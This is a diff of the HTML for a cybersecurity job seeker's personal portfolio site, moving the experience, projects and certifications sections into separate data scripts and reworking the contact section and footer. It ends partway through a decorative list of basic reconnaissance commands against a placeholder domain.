                     <div class="skill-tags">
-                        <span class="skill-tag expert" data-tooltip="Open Web Application Security Project Top 10 - Expert level proficiency">OWASP Top 10</span>
-                        <span class="skill-tag advanced" data-tooltip="MITRE Adversarial Tactics and Techniques - Advanced proficiency">MITRE ATT&CK</span>
-                        <span class="skill-tag advanced" data-tooltip="Penetration Testing Execution Standard - Advanced proficiency">PTES</span>
-                        <span class="skill-tag intermediate" data-tooltip="Lockheed Martin cyber kill chain methodology - Intermediate proficiency">Cyber Kill Chain</span>
-                        <span class="skill-tag advanced" data-tooltip="Common Vulnerability Scoring System - Advanced proficiency">CVSS</span>
-                        <span class="skill-tag expert" data-tooltip="General Data Protection Regulation compliance - Expert level proficiency">GDPR</span>
-                        <span class="skill-tag expert" data-tooltip="Payment Card Industry Data Security Standard - Expert level proficiency">PCI DSS</span>
-                        <span class="skill-tag advanced" data-tooltip="National Institute of Standards and Technology - Advanced proficiency">NIST</span>
+                        <span class="skill-tag advanced">Ethereum/Smart Contracts</span>
+                        <span class="skill-tag intermediate">Web3.js</span>
+                        <span class="skill-tag intermediate">DeFi Protocols</span>
+                        <span class="skill-tag advanced">Blockchain Security</span>
+                        <span class="skill-tag intermediate">IPFS</span>
+                        <span class="skill-tag beginner">Machine Learning/AI</span>
+                        <span class="skill-tag intermediate">IoT Security</span>
                     </div>
                 </div>
             </div>
         </div>
     </section>
 
-    <!-- Experience Timeline -->
-    <section id="experience" class="section section-white">
-        <div class="section-title" data-aos="fade-up">Professional Journey</div>
-        <div class="section-subtitle" data-aos="fade-up" data-aos-delay="200">
-            Evolution from software engineering to cybersecurity specialization
-        </div>
-
-        <div class="timeline-section">
-            <div class="timeline">
-                <div class="timeline-item" data-aos="fade-right" data-aos-delay="200">
-                    <div class="timeline-content">
-                        <div class="timeline-date">Sep 2024 - Present</div>
-                        <div class="timeline-role">MSc Student & OSCP Graduate</div>
-                        <div class="timeline-company">University of Sheffield</div>
-                        <p  class="timeline-text">Completing MSc in Cybersecurity and Artificial Intelligence with Merit classification expected. Achieved OSCP and OSCP+ certifications. Pursuing CREST certification for UK market readiness.</p>
-                        <div style="margin-top: 1rem;">
-                            <span class="tech-badge">MSc Cybersecurity & AI</span>
-                            <span class="tech-badge">OSCP Certified</span>
-                            <span class="tech-badge">CREST In Progress</span>
-                        </div>
-                    </div>
-                    <div class="timeline-dot"></div>
-                </div>
-
-                <div class="timeline-item" data-aos="fade-left" data-aos-delay="400">
-                    <div class="timeline-content">
-                        <div class="timeline-date">Apr 2022 - Jun 2024</div>
-                        <div class="timeline-role">Senior Software Engineer</div>
-                        <div class="timeline-company">Sorvox Groups, Pakistan</div>
-                        <p  class="timeline-text">Led security assessments and infrastructure hardening. Enhanced Linux cluster security achieving 25% improvement in system availability. Implemented DevSecOps practices and security testing environments.</p>
-                        <div style="margin-top: 1rem;">
-                            <span class="tech-badge">Security Assessment</span>
-                            <span class="tech-badge">Infrastructure Security</span>
-                            <span class="tech-badge">DevSecOps</span>
-                        </div>
-                    </div>
-                    <div class="timeline-dot"></div>
-                </div>
-
-                <div class="timeline-item" data-aos="fade-right" data-aos-delay="600">
-                    <div class="timeline-content">
-                        <div class="timeline-date">Oct 2020 - Mar 2022</div>
-                        <div class="timeline-role">Senior Software Engineer</div>
-                        <div class="timeline-company">Apricart E-Stores, Pakistan</div>
-                        <p  class="timeline-text">Led secure payment gateway integrations with JS Bank ensuring PCI DSS compliance. Improved API security and developed monitoring systems. Achieved Employee of the Month recognition.</p>
-                        <div style="margin-top: 1rem;">
-                            <span class="tech-badge">Payment Security</span>
-                            <span class="tech-badge">PCI DSS Compliance</span>
-                            <span class="tech-badge">API Security</span>
-                        </div>
-                    </div>
-                    <div class="timeline-dot"></div>
-                </div>
-
-                <div class="timeline-item" data-aos="fade-left" data-aos-delay="800">
-                    <div class="timeline-content">
-                        <div class="timeline-date">Dec 2019 - Aug 2020</div>
-                        <div class="timeline-role">Full Stack Developer</div>
-                        <div class="timeline-company">Creative Drop DMCC, UAE</div>
-                        <p  class="timeline-text">Developed secure CMS backends with integrated security measures. Implemented JWT and OAuth authentication systems. Automated DNS management with security-focused scripting.</p>
-                        <div style="margin-top: 1rem;">
-                            <span class="tech-badge">Secure Development</span>
-                            <span class="tech-badge">Authentication Systems</span>
-                            <span class="tech-badge">Security Automation</span>
-                        </div>
-                    </div>
-                    <div class="timeline-dot"></div>
-                </div>
-
-                <div class="timeline-item" data-aos="fade-right" data-aos-delay="1000">
-                    <div class="timeline-content">
-                        <div class="timeline-date">Jan 2019 - Aug 2020</div>
-                        <div class="timeline-role">Software Engineer</div>
-                        <div class="timeline-company">Chatcloud.co, Pakistan</div>
-                        <p class="timeline-text">Implemented security measures for backend systems across Microsoft and Linux platforms. Developed scalable microservices with key-based authentication. Enhanced infrastructure security through clustering.</p>
-                        <div style="margin-top: 1rem;">
-                            <span class="tech-badge">Microservices Security</span>
-                            <span class="tech-badge">Platform Security</span>
-                            <span class="tech-badge">Infrastructure Hardening</span>
-                        </div>
-                    </div>
-                    <div class="timeline-dot"></div>
-                </div>
+    <!-- Experience Section -->
+    <section id="experience" class="section">
+        <div class="container">
+            <h2 class="section-title">Professional Experience</h2>
+            <div class="timeline" id="experience-timeline">
+                <!-- Timeline items will be loaded from experience.js -->
             </div>
         </div>
     </section>
 
-    <!-- Projects Carousel Section -->
-    <section id="projects" class="section section-dark">
-        <div class="section-title" data-aos="fade-up">Featured Projects</div>
-        <div class="section-subtitle" data-aos="fade-up" data-aos-delay="200">
-            Showcasing cybersecurity research, enterprise security implementations, and technical innovations
-        </div>
-
-        <div class="projects-carousel" data-aos="fade-up" data-aos-delay="400">
-            <div class="carousel-container" id="carousel-container">
-                <!-- Slide 1: Cybersecurity Projects -->
-                <div class="carousel-slide">
-                    <div class="project-category-header">
-                        <i class="fas fa-shield-alt"></i>
-                        Cybersecurity & Security Research Projects
-                    </div>
-                    <div class="projects-grid">
-                        <div class="project-card" data-tooltip="Automated penetration testing framework reducing manual testing time by 40%">
-                            <div class="project-title">
-                                <span class="project-type">Security Research</span></br>
-                            </div>
-                            <div class="project-title">
-                                <i class="fas fa-robot"></i>
-                                Advanced Penetration Testing Automation
-                            </div>
-                            <p style="color: #94a3b8; margin-bottom: 1rem;">
-                                Custom automation framework following PTES methodology with integrated payload generation and report automation covering 20+ assessment types.
-                            </p>
-                            <div class="project-tech">
-                                <span class="tech-badge">Python</span>
-                                <span class="tech-badge">Nmap</span>
-                                <span class="tech-badge">Burp Suite API</span>
-                                <span class="tech-badge">OWASP ZAP</span>
-                            </div>
-                        </div>
-
-                        <div class="project-card" data-tooltip="Comprehensive enterprise security implementation with zero incidents over 24 months">
-                            <div class="project-title">
-                                <span class="project-type">Professional</span></br>
-                            </div>
-                            <div class="project-title">
-                                <i class="fas fa-building"></i>
-                                Enterprise Application Security Implementation
-                            </div>
-                            <p style="color: #94a3b8; margin-bottom: 1rem;">
-                                Implemented OWASP Top 10 mitigation strategies, secure payment processing, and real-time threat monitoring achieving PCI DSS compliance.
-                            </p>
-                            <div class="project-tech">
-                                <span class="tech-badge">OWASP Top 10</span>
-                                <span class="tech-badge">PCI DSS</span>
-                                <span class="tech-badge">Threat Monitoring</span>
-                                <span class="tech-badge">Payment Security</span>
-                            </div>
-                        </div>
-
-                        <div class="project-card" data-tooltip="Critical vulnerability research resulting in 100% threat neutralization">
-                            <div class="project-title">
-                                <span class="project-type">Research</span>
-                            </div>
-                            <div class="project-title">
-                                <i class="fas fa-bug"></i>
-                                Critical CMS Vulnerability Research & IDPS
-                            </div>
-                            <p style="color: #94a3b8; margin-bottom: 1rem;">
-                                Identified and neutralized active SQL injection and XSS exploitation attempts. Deployed comprehensive IDPS with custom rule sets.
-                            </p>
-                            <div class="project-tech">
-                                <span class="tech-badge">Vulnerability Research</span>
-                                <span class="tech-badge">SQL Injection</span>
-                                <span class="tech-badge">XSS</span>
-                                <span class="tech-badge">IDPS</span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Slide 2: University Projects -->
-                <div class="carousel-slide">
-                    <div class="project-category-header">
-                        <i class="fas fa-graduation-cap"></i>
-                        University & Academic Projects
-                    </div>
-                    <div class="projects-grid">
-                        <div class="project-card" data-tooltip="Security research project for disabled accessibility with remote computer control">
-                            <div class="project-title">
-                                <span class="project-type">University Research</span>
-                            </div>
-                            <div class="project-title">
-                                <i class="fas fa-mobile-alt"></i>
-                                Mobile Application for Disabled People
-                            </div>
-                            <p style="color: #94a3b8; margin-bottom: 1rem;">
-                                Remote access application allowing disabled users to control computers through mobile devices with real-time display capabilities and security considerations.
-                            </p>
-                            <div class="project-tech">
-                                <span class="tech-badge">Java</span>
-                                <span class="tech-badge">Mobile Development</span>
-                                <span class="tech-badge">Accessibility</span>
-                                <span class="tech-badge">Remote Access</span>
-                            </div>
-                        </div>
-
-                        <div class="project-card" data-tooltip="Innovative drag-and-drop mobile app development platform">
-                            <div class="project-title">
-                                <span class="project-type">Technology Entrepreneurship</span>
-                            </div>
-                            <div class="project-title">
-                                <i class="fas fa-mobile"></i>
-                                SCAPLEON IDE - Mobile App Builder
-                            </div>
-                            <p style="color: #94a3b8; margin-bottom: 1rem;">
-                                WYSIWYG hybrid mobile application creator using Cordova frameworks with drag-and-drop capabilities and real-time preview.
-                            </p>
-                            <div class="project-tech">
-                                <span class="tech-badge">.NET</span>
-                                <span class="tech-badge">Socket Programming</span>
-                                <span class="tech-badge">Knockout.JS</span>
-                                <span class="tech-badge">Ionic Cordova</span>
-                            </div>
-                        </div>
-
-                        <div class="project-card" data-tooltip="Advanced AI algorithm implementations with interactive visualizations">
-                            <div class="project-title">
-                                <span class="project-type">Artificial Intelligence</span>
-                            </div>
-                            <div class="project-title">
-                                <i class="fas fa-brain"></i>
-                                AI Algorithm Interactive Simulators
-                            </div>
-                            <p style="color: #94a3b8; margin-bottom: 1rem;">
-                                Created interactive simulators for Ant Colony, Hill Climbing, A*, and Dijkstra's algorithms with maze generation and pathfinding visualizations.
-                            </p>
-                            <div class="project-tech">
-                                <span class="tech-badge">.NET</span>
-                                <span class="tech-badge">Python</span>
-                                <span class="tech-badge">AI Algorithms</span>
-                                <span class="tech-badge">Visualization</span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Slide 3: Enterprise & Professional Projects -->
-                <div class="carousel-slide">
-                    <div class="project-category-header">
-                        <i class="fas fa-building"></i>
-                        Enterprise & Professional Projects
-                    </div>
-                    <div class="projects-grid">
-                        <div class="project-card" data-tooltip="Complete streaming platform with advanced security and payment integration">
-                            <div class="project-title">
-                                <span class="project-type">Enterprise</span>
-                            </div>
-                            <div class="project-title">
-                                <i class="fas fa-video"></i>
-                                Streamrolla - Secure Video Platform
-                            </div>
-                            <p style="color: #94a3b8; margin-bottom: 1rem;">
-                                Full-stack streaming platform with secure payment integration, user management, and advanced analytics achieving 20% delivery improvement.
-                            </p>
-                            <div class="project-tech">
-                                <span class="tech-badge">React</span>
-                                <span class="tech-badge">Node.js</span>
-                                <span class="tech-badge">Payment Security</span>
-                                <span class="tech-badge">Analytics</span>
-                            </div>
-                        </div>
-
-                        <div class="project-card" data-tooltip="Custom hosting platform with ICANN integration and domain management">
-                            <div class="project-title">
-                                <span class="project-type">Business</span>
-                            </div>
-                            <div class="project-title">
-                                <i class="fas fa-server"></i>
-                                HostSorvox - Hosting Platform
-                            </div>
-                            <p style="color: #94a3b8; margin-bottom: 1rem;">
-                                Custom cloud hosting platform with domain lifecycle management, ICANN membership integration, and OWASP security protocols.
-                            </p>
-                            <div class="project-tech">
-                                <span class="tech-badge">Cloud Infrastructure</span>
-                                <span class="tech-badge">Domain Management</span>
-                                <span class="tech-badge">ICANN</span>
-                                <span class="tech-badge">OWASP Security</span>
-                            </div>
-                        </div>
-
-                        <div class="project-card" data-tooltip="AI-powered lead generation platform with real-time communication">
-                            <div class="project-title">
-                                <span class="project-type">Leadership</span>
-                            </div>
-                            <div class="project-title">
-                                <i class="fas fa-comments"></i>
-                                ChatCloud - AI Chat Solutions
-                            </div>
-                            <p style="color: #94a3b8; margin-bottom: 1rem;">
-                                Lead generation platform combining human and AI chat solutions with microservices architecture and Twilio integration.
-                            </p>
-                            <div class="project-tech">
-                                <span class="tech-badge">Microservices</span>
-                                <span class="tech-badge">AI Integration</span>
-                                <span class="tech-badge">Real-time</span>
-                                <span class="tech-badge">Twilio APIs</span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Slide 4: Creative & Technical Projects -->
-                <div class="carousel-slide">
-                    <div class="project-category-header">
-                        <i class="fas fa-gamepad"></i>
-                        Creative & Low-Level Programming Projects
-                    </div>
-                    <div class="projects-grid">
-                        <div class="project-card" data-tooltip="Classic games implemented in pure assembly language with graphics programming">
-                            <div class="project-title">
-                                <span class="project-type">Personal</span>
-                            </div>
-                            <div class="project-title">
-                                <i class="fas fa-th"></i>
-                                Assembly Language Game Collection
-                            </div>
-                            <p style="color: #94a3b8; margin-bottom: 1rem;">
-                                Complete implementations of Brick Breaker, Tic-Tac-Toe, Snake, and Hangman using 8086 assembly with video and graphics interrupts.
-                            </p>
-                            <div class="project-tech">
-                                <span class="tech-badge">8086 Assembly</span>
-                                <span class="tech-badge">x86 Assembly</span>
-                                <span class="tech-badge">Graphics Programming</span>
-                                <span class="tech-badge">Game Development</span>
-                            </div>
-                        </div>
-
-                        <div class="project-card" data-tooltip="Real-time networking games with AI opponents and multiplayer support">
-                            <div class="project-title">
-                                <span class="project-type">Personal</span>
-                            </div>
-                            <div class="project-title">
-                                <i class="fas fa-network-wired"></i>
-                                Networked Gaming with AI
-                            </div>
-                            <p style="color: #94a3b8; margin-bottom: 1rem;">
-                                Developed networked versions of classic games including 2D fighting game (Street Fighter style), Pacman clone, and Snake with AI opponents.
-                            </p>
-                            <div class="project-tech">
-                                <span class="tech-badge">.NET</span>
-                                <span class="tech-badge">Networking</span>
-                                <span class="tech-badge">AI Programming</span>
-                                <span class="tech-badge">Game Logic</span>
-                            </div>
-                        </div>
-
-                        <div class="project-card" data-tooltip="E-commerce marketplace for video games with secure transaction processing">
-                            <div class="project-title">
-                                <span class="project-type">University</span>
-                            </div>
-                            <div class="project-title">
-                                <i class="fas fa-shopping-cart"></i>
-                                ChalKhareed - Gaming Marketplace
-                            </div>
-                            <p style="color: #94a3b8; margin-bottom: 1rem;">
-                                Secure e-commerce platform for video game marketplace with integrated payment processing, user management, and transaction security.
-                            </p>
-                            <div class="project-tech">
-                                <span class="tech-badge">C#</span>
-                                <span class="tech-badge">ASP.NET Razor</span>
-                                <span class="tech-badge">MSSQL</span>
-                                <span class="tech-badge">E-commerce Security</span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
+    <!-- Projects Section -->
+    <section id="projects" class="section section-alt">
+        <div class="container">
+            <h2 class="section-title">Featured Projects</h2>
+            <div class="projects-filter">
+                <button class="filter-btn active" data-filter="all">All</button>
+                <button class="filter-btn" data-filter="security">Security</button>
+                <button class="filter-btn" data-filter="development">Development</button>
+                <button class="filter-btn" data-filter="blockchain">Blockchain</button>
+                <button class="filter-btn" data-filter="enterprise">Enterprise</button>
             </div>
+            <div class="projects-grid" id="projects-grid">
+                <!-- Projects will be loaded from projects.js -->
+            </div>
+        </div>
+    </section>
 
-            <div class="carousel-controls">
-                <div class="carousel-dot active" onclick="goToSlide(0)" data-tooltip="Cybersecurity & Security Research Projects"></div>
-                <div class="carousel-dot" onclick="goToSlide(1)" data-tooltip="University & Academic Research Projects"></div>
-                <div class="carousel-dot" onclick="goToSlide(2)" data-tooltip="Enterprise & Professional Projects"></div>
-                <div class="carousel-dot" onclick="goToSlide(3)" data-tooltip="Creative & Low-Level Programming Projects"></div>
+    <!-- Certifications Section -->
+    <section id="certifications" class="section">
+        <div class="container">
+            <h2 class="section-title">Certifications & Education</h2>
+            <div class="certifications-grid" id="certifications-grid">
+                <!-- Certifications will be loaded from certifications.js -->
             </div>
         </div>
     </section>
 
     <!-- Contact Section -->
-    <section id="contact" class="section contact-enhanced">
-        <div class="section-title" data-aos="fade-up">Get in Touch</div>
-        <div class="section-subtitle" data-aos="fade-up" data-aos-delay="200">
-            Available for cybersecurity opportunities in the UK market
-        </div>
-
-        <div class="contact-grid" data-aos="fade-up" data-aos-delay="400">
-            <div class="contact-card" data-tooltip="Professional email for job applications and collaboration">
-                <div class="contact-icon"><i class="fas fa-envelope"></i></div>
-                <h3 style="color: var(--primary-color); margin-bottom: 1rem;">Email</h3>
-                <p style="color: white; margin: 0;">
-                    <a href="mailto:mramis1@outlook.com" style="color: var(--primary-color); text-decoration: none;">
-                        mramis1@outlook.com
-                    </a>
-                </p>
+    <section id="contact" class="section section-alt">
+        <div class="container">
+            <h2 class="section-title">Get in Touch</h2>
+            <p class="section-subtitle">Available for cybersecurity and development opportunities in the UK</p>
+            
+            <div class="contact-grid">
+                <div class="contact-info">
+                    <div class="contact-item">
+                        <i class="fas fa-envelope"></i>
+                        <div>
+                            <h3>Email</h3>
+                            <a href="mailto:mramis1@outlook.com">mramis1@outlook.com</a>
+                        </div>
+                    </div>
+                    <div class="contact-item">
+                        <i class="fas fa-phone"></i>
+                        <div>
+                            <h3>Phone</h3>
+                            <a href="tel:+447789399920">07789 399 920</a>
+                        </div>
+                    </div>
+                    <div class="contact-item">
+                        <i class="fas fa-map-marker-alt"></i>
+                        <div>
+                            <h3>Location</h3>
+                            <p>Leeds, West Yorkshire, UK</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="contact-form">
+                    <form id="contact-form">
+                        <div class="form-group">
+                            <input type="text" id="name" name="name" placeholder="Your Name" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="email" id="email" name="email" placeholder="Your Email" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="text" id="subject" name="subject" placeholder="Subject" required>
+                        </div>
+                        <div class="form-group">
+                            <textarea id="message" name="message" rows="5" placeholder="Your Message" required></textarea>
+                        </div>
+                        <button type="submit" class="btn btn-primary">
+                            <i class="fas fa-paper-plane"></i> Send Message
+                        </button>
+                    </form>
+                </div>
             </div>
-
-            <div class="contact-card" data-tooltip="UK mobile number - available for immediate contact">
-                <div class="contact-icon"><i class="fas fa-phone"></i></div>
-                <h3 style="color: var(--primary-color); margin-bottom: 1rem;">Phone</h3>
-                <p style="color: white; margin: 0;">
-                    <a href="tel:+447789399920" style="color: var(--primary-color); text-decoration: none;">
-                        07789 399 920
-                    </a>
-                </p>
+            
+            <div class="social-links">
+                <a href="https://linkedin.com/in/imramis" target="_blank" aria-label="LinkedIn">
+                    <i class="fab fa-linkedin"></i>
+                </a>
+                <a href="https://github.com/imRamis" target="_blank" aria-label="GitHub">
+                    <i class="fab fa-github"></i>
+                </a>
+                <a href="https://tryhackme.com/p/mriramis" target="_blank" aria-label="TryHackMe">
+                    <i class="fas fa-flag"></i>
+                </a>
+                <a href="https://ctf.hackthebox.com/user/profile/744664" target="_blank" aria-label="HackTheBox">
+                    <i class="fas fa-cube"></i>
+                </a>
             </div>
-
-            <div class="contact-card" data-tooltip="Currently based in Leeds, West Yorkshire, UK">
-                <div class="contact-icon"><i class="fas fa-map-marker-alt"></i></div>
-                <h3 style="color: var(--primary-color); margin-bottom: 1rem;">Location</h3>
-                <p style="color: white; margin: 0;">Leeds, West Yorkshire</p>
-                <p style="color: #94a3b8; font-size: 0.9rem;">Available for relocation within UK</p>
-            </div>
-
-            <div class="contact-card" data-tooltip="Seeking junior to mid-level cybersecurity roles in the UK">
-                <div class="contact-icon"><i class="fas fa-briefcase"></i></div>
-                <h3 style="color: var(--primary-color); margin-bottom: 1rem;">Availability</h3>
-                <p style="color: white; margin: 0;">Immediate Start Available</p>
-                <p style="color: #94a3b8; font-size: 0.9rem;">Junior-Mid Level Cybersecurity Roles</p>
-            </div>
-        </div>
-
-        <div class="social-links" data-aos="fade-up" data-aos-delay="600">
-            <a href="https://linkedin.com/in/imramis" target="_blank" class="social-link" data-tooltip="Connect on LinkedIn for professional networking">
-                <i class="fab fa-linkedin-in"></i>
-            </a>
-            <a href="https://github.com/imRamis" target="_blank" class="social-link" data-tooltip="View code repositories and technical projects">
-                <i class="fab fa-github"></i>
-            </a>
-            <a href="https://tryhackme.com/p/mriramis" target="_blank" class="social-link" data-tooltip="TryHackMe profile showing cybersecurity skills">
-                <i class="fas fa-flag"></i>
-            </a>
-            <a href="https://ctf.hackthebox.com/user/profile/744664" target="_blank" class="social-link" data-tooltip="HackTheBox CTF profile demonstrating penetration testing skills">
-                <i class="fas fa-cube"></i>
-            </a>
         </div>
     </section>
 
-    <!-- Resume Modal -->
-    <div class="resume-modal" id="resume-modal">
-        <div class="resume-content">
-            <div class="resume-close" onclick="closeResumeModal()">&times;</div>
-            <div style="text-align: center; padding: 2rem;">
-                <h2 style="color: var(--primary-color); margin-bottom: 2rem;">Muhammad Ramis - Professional CV</h2>
-                <p style="margin-bottom: 2rem; color: var(--text-light);">
-                    Download comprehensive CV showcasing OSCP certification, Sheffield University education, and cybersecurity expertise
-                </p>
-                <a href="#" onclick="downloadResume()" style="background: var(--gradient-1); color: white; padding: 1rem 2rem; border-radius: 10px; text-decoration: none; display: inline-block; margin-bottom: 1rem;">
-                    <i class="fas fa-download"></i> Download PDF CV
-                </a>
-                <div style="margin-top: 2rem; text-align: left; max-height: 400px; overflow-y: auto; border: 1px solid #ddd; padding: 1rem; border-radius: 10px;">
-                    <h3>CV Highlights:</h3>
-                    <ul>
-                        <li><strong>OSCP & OSCP+ Certified</strong> (April 2025) - Advanced penetration testing</li>
-                        <li><strong>Sheffield University Graduate</strong> - MSc Cybersecurity & AI (2024-2025)</li>
-                        <li><strong>CREST Certification</strong> - In progress for UK market standards</li>
-                        <li><strong>5+ Years Experience</strong> - Software engineering with security focus</li>
-                        <li><strong>Enterprise Security</strong> - PCI DSS compliance and vulnerability assessment</li>
-                        <li><strong>Leeds, West Yorkshire</strong> - Available for UK opportunities</li>
-                        <li><strong>Multiple Awards</strong> - Employee of Month, Hackathon victories</li>
-                    </ul>
-                </div>
-            </div>
-        </div>
-    </div>
-
     <!-- Footer -->
-    <footer style="background: var(--bg-dark); color: white; text-align: center; padding: 2rem; border-top: 1px solid var(--primary-color);">
-        <p>&copy; 2025 Muhammad Ramis | OSCP-Certified Cybersecurity Specialist | Sheffield University Graduate | Leeds, UK</p>
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2025 Muhammad Ramis. All rights reserved.</p>
+            <p>OSCP Certified • Sheffield University Graduate • Full-Stack Developer</p>
+        </div>
     </footer>
 
-    <!-- Scripts -->
+    <!-- External Scripts -->
     <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
-    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12"></script>
-
-        <!-- Google Analytics (Your actual ID) -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GKD7JXRS66"></script>
+    <script src="js/config.js"></script>
+    <script src="js/theme.js"></script>
+    <script src="js/animations.js"></script>
+    <script src="js/data/experience.js"></script>
+    <script src="js/data/projects.js"></script>
+    <script src="js/data/certifications.js"></script>
+    <script src="js/main.js"></script>
     
+    <!-- Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GKD7JXRS66"></script>
     <script>
-        // Global variables
-        let currentSlide = 0;
-        const totalSlides = 4;
-
-        // Enhanced initialization
-        window.addEventListener('load', function() {
-            setTimeout(() => {
-                document.getElementById('loading').style.opacity = '0';
-                setTimeout(() => {
-                    document.getElementById('loading').style.display = 'none';
-                    initializePortfolio();
-                }, 500);
-            }, 2000);
-        });
-        // Analytics Event Tracking
-        function trackEvent(action, category, label) {
-            // Google Analytics 4 event tracking
-            if (typeof gtag !== 'undefined') {
-                gtag('event', action, {
-                    'event_category': category,
-                    'event_label': label
-                });
-            }
-            
-            // Microsoft Clarity custom events
-            if (typeof clarity !== 'undefined') {
-                clarity('set', action, label);
-            }
-        }
-                // Track user interactions
-        function setupAnalytics() {
-            // Track button clicks
-            document.querySelectorAll('.btn').forEach(btn => {
-                btn.addEventListener('click', (e) => {
-                    trackEvent('button_click', 'engagement', e.target.textContent);
-                });
-            });
-            
-            // Track section views
-            const sections = document.querySelectorAll('section[id]');
-            const observer = new IntersectionObserver((entries) => {
-                entries.forEach(entry => {
-                    if (entry.isIntersecting) {
-                        trackEvent('section_view', 'navigation', entry.target.id);
-                    }
-                });
-            }, { threshold: 0.5 });
-            
-            sections.forEach(section => observer.observe(section));
-            
-            // Track contact link clicks
-            document.querySelectorAll('a[href^="mailto:"], a[href^="tel:"]').forEach(link => {
-                link.addEventListener('click', (e) => {
-                    trackEvent('contact_click', 'conversion', e.target.href);
-                });
-            });
-            
-            // Track external link clicks
-            document.querySelectorAll('a[target="_blank"]').forEach(link => {
-                link.addEventListener('click', (e) => {
-                    trackEvent('external_link', 'engagement', e.target.href);
-                });
-            });
-        }
-
-        function initializePortfolio() {
-            // Initialize AOS
-            AOS.init({
-                duration: 1000,
-                once: true,
-                offset: 100
-            });
-
-            // Initialize particles
-            setTimeout(() => {
-                initParticles();
-            }, 1000);
-
-            // Initialize typed text with UK focus
-            new Typed('#typed-text', {
-                strings: [
-                    'OSCP-Certified Penetration Tester',
-                    'Sheffield University Graduate', 
-                    'Cybersecurity Specialist',
-                    'Vulnerability Assessment Expert',
-                    'Secure Development Engineer',
-                    'CREST Certification Candidate',
-                    'Enterprise Security Consultant',
-                    'Software Engineering Leader',
-                    'DevSecOps Practitioner',
-                    'Security Research Professional',
-                    'PCI DSS Compliance Expert',
-                    'Digital Forensics Analyst',
-                    'Binary Analysis Specialist',
-                    'Leeds-Based Professional'
-                ],
-                typeSpeed: 60,
-                backSpeed: 30,
-                backDelay: 2000,
-                startDelay: 1000,
-                loop: true,
-                showCursor: false
-            });
-
-            // Initialize all features
-            updateScrollProgress();
-            initCustomTooltips();
-            createFloatingCommands();
-            startCarouselAutoplay();
-        }
-
-        function initParticles() {
-            const primaryColor = getComputedStyle(document.documentElement)
-                .getPropertyValue('--primary-color').trim();
-                
-            particlesJS('particles-js', {
-                particles: {
-                    number: {
-                        value: 60,
-                        density: {
-                            enable: true,
-                            value_area: 800
-                        }
-                    },
-                    color: {
-                        value: primaryColor
-                    },
-                    shape: {
-                        type: ["circle", "triangle"],
-                        stroke: {
-                            width: 0,
-                            color: "#000000"
-                        }
-                    },
-                    opacity: {
-                        value: 0.4,
-                        random: false,
-                        anim: {
-                            enable: true,
-                            speed: 1,
-                            opacity_min: 0.1,
-                            sync: false
-                        }
-                    },
-                    size: {
-                        value: 3,
-                        random: true,
-                        anim: {
-                            enable: true,
-                            speed: 2,
-                            size_min: 0.1,
-                            sync: false
-                        }
-                    },
-                    line_linked: {
-                        enable: true,
-                        distance: 150,
-                        color: primaryColor,
-                        opacity: 0.4,
-                        width: 1
-                    },
-                    move: {
-                        enable: true,
-                        speed: 2,
-                        direction: "none",
-                        random: false,
-                        straight: false,
-                        out_mode: "out",
-                        bounce: false
-                    }
-                },
-                interactivity: {
-                    detect_on: "canvas",
-                    events: {
-                        onhover: {
-                            enable: true,
-                            mode: "repulse"
-                        },
-                        onclick: {
-                            enable: true,
-                            mode: "push"
-                        },
-                        resize: true
-                    }
-                },
-                retina_detect: true
-            });
-        }
-
-        // Enhanced theme management with consistent color updates
-        function setTheme(theme) {
-            document.documentElement.setAttribute('data-theme', theme);
-            sessionStorage.setItem('portfolio-theme', theme);
-            
-            // Update active theme button
-            document.querySelectorAll('.theme-btn').forEach(btn => btn.classList.remove('active'));
-            document.querySelector(`.theme-btn.${theme}`).classList.add('active');
-            
-            // Update particles color consistently
-            const colors = {
-                red: '#dc2626',
-                blue: '#0ea5e9', 
-                green: '#059669',
-                purple: '#7c3aed'
-            };
-            
-            if (window.pJSDom && window.pJSDom[0]) {
-                window.pJSDom[0].pJS.particles.color.value = colors[theme];
-                window.pJSDom[0].pJS.particles.line_linked.color = colors[theme];
-                window.pJSDom[0].pJS.fn.particlesRefresh();
-            }
-        }
-
-        // Load saved theme
-        document.addEventListener('DOMContentLoaded', function() {
-            const savedTheme = sessionStorage.getItem('portfolio-theme') || 'red';
-            setTheme(savedTheme);
-        });
-
-        // Enhanced custom tooltips with rich content
-        function initCustomTooltips() {
-    const tooltip = document.getElementById('custom-tooltip');
-    const elementsWithTooltips = document.querySelectorAll('[data-tooltip]');
-
-    elementsWithTooltips.forEach(element => {
-        element.addEventListener('mouseenter', (e) => {
-            const text = e.target.getAttribute('data-tooltip');
-            if (text) {
-                tooltip.innerHTML = text;
-                tooltip.classList.add('show');
-                updateTooltipPosition(e);
-            }
-        });
-
-        element.addEventListener('mousemove', updateTooltipPosition);
-
-        element.addEventListener('mouseleave', () => {
-            tooltip.classList.remove('show');
-        });
-    });
-
-    function updateTooltipPosition(e) {
-        const rect = tooltip.getBoundingClientRect();
-        const x = e.pageX;
-        const y = e.pageY;
-
-
-    let tooltipX = x - rect.width / 2;
-    let tooltipY = y - rect.height - 15;
-
-        // Keep tooltip on screen
-        if (tooltipX + rect.width > document.documentElement.scrollWidth) {
-            tooltipX = x - rect.width - 15;
-        }
-        if (tooltipY < window.scrollY) {
-            tooltipY = y + 15;
-        }
-
-        tooltip.style.left = tooltipX + 'px';
-        tooltip.style.top = tooltipY + 'px';
-        tooltip.style.position = 'absolute';  // Ensure it's not fixed
-    }
-}
-
-
-        // Floating terminal commands animation
-        function createFloatingCommands() {
-    const container = document.getElementById('terminal-commands');
-const commands = [
-    // Reconnaissance
-    'nmap -sC -sV -p- target.com',
-    'whois target.com',
-    'dig +short target.com',
-    'traceroute target.com',
-    'nslookup target.com',
-    'theharvester -d target.com -l 100 -b all',
